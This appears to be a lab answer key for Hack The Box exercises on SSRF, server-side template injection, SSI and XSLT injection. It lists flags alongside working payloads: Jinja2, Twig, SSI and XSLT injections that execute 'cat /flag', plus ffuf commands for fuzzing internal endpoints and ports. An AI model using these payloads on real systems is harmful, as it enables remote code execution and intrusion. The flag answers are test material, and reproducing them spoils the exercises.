# Identifying SSRF

1. Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag.

Answer: HTB{911fc5badf7d65aed95380d536c270f8}

Explanation: The rquest to the internal server and this request got executed. 

The request: dateserver=http://127.0.0.1/index.php&date=2024-01-01

# Exploiting SSRF

1. Exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag.

Answer: HTB{61ea58507c2b9da30465b9582d6782a1}

Explanation:Fuzz

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.34.114/index.php -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01' -fs 276,279

dateserver=http://dateserver.htb/admin.php&date=2024-01-01

# Blind SSRF

1. Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?

Answer: 5000

Explanation: 

ffuf -w ports.txt -u http://10.129.245.15/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb:FUZZ/availability.php&date=2024-01-01" -fr 'Something went wrong!'

Request: dateserver=http://dateserver.htb:5000/availability.php&date=2024-01-01

Response: Date is unavailable. Please choose a different date!

# Identifying SSTI 

1. Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer.

Answer: Twig

Explanation: {{7*'7'}}

# Exploiting SSTI - Jinja2

Answer: HTB{295649e25b4d852185ba34907ec80643}

Explanation: Payload: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}

# Exploiting SSTI - TWIG

1. Exploit the SSTI vulnerability to obtain RCE and read the flag.

Answer: HTB{5034a6692604de344434ae83f1cdbec6}

Explanation: Payload: {{ ['cat /flag.txt'] | filter('system') }}

# Exploiting SSI Injection

1. Exploit the SSI Injection vulnerability to obtain RCE and read the flag.

Answer: HTB{81e5d8e80eec8e961a31229e4a5e737e}

Explanation: <!--#exec cmd="cat /flag.txt" -->

# Exploiting XSLT Injection

1. Exploit the XSLT Injection vulnerability to obtain RCE and read the flag. 

Answer: HTB{3a4fe85c1f1e2b61cabe9836a150f892} 

Explanation: Payload: <xsl:value-of select="php:function('system','cat /flag')" />

# Skill Assessment 

1. Obtain the flag

Answer: HTB{3b8e2b940775e0267ce39d7c80488fc8}

Explanation: http://truckapi.htb/?id%3D{{['cat${IFS}/flag.txt']|filter('system')}}